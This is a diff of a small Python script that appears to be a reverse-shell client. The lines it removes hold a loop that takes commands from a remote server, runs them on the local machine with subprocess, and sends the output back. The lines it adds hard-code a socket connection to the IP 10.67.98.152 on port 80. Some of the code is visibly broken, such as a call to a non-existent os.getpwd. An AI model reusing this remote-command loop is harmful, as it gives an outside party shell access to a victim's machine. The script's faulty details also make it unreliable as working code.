@@ -3,54 +3,18 @@ import os
 import subprocess
 import sys
 
+
+s = socket.socket() # Creats a socket 
+
 Name = socket.gethostname() #Gets name of Device
-Host = socket.gethostbyname(Name)  #Gets the IPV4 Address of the Device
+Host = socket.gethostbyname("localhost")  #Gets the IPV4 Address of the current Device
 
-#get IP Address of Current Machine
-Port = 443
-BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
+
+Port = 80 # Port 80 HTTP
+
 # separator string for sending 2 messages in one go
-SEPARATOR = "<sep>"
 
-# create the socket object
-s = socket.socket()
 # connect to the server
-s.connect((Host, Port))
-
-cwd = 'cwd'
-os.system(cwd)
-
-s.send(cwd.encode())
-
-"""
-
-while True:
+s.connect(('10.67.98.152', Port)) #Hard coded. Change to your computer's IP in order to test code
 
 
-    command = s.recv(BUFFER_SIZE).decode()
-    splited_command = command.split()
-    if command.lower() == "quit":
-        # if the command is quit, just break out of the loop
-        break
-    if splited_command[0].lower() == "cd":
-        # cd command, change directory
-        try:
-            os.chdir(' '.join(splited_command[1:]))
-        except FileNotFoundError as e:
-            # if there is an error, set as the output
-            output = str(e)
-        else:
-            # if operation is successful, empty message
-            output = ""
-    else:
-        # execute the command and retrieve the results
-        output = subprocess.getoutput(command)
-    # get the current working directory as output
-    pwd = os.getpwd()
-    # send the results back to the server
-    message = f"{output}{SEPARATOR}{pwd}"
-    s.send(message.encode())
-
-# close client connection
-s.close()
-"""
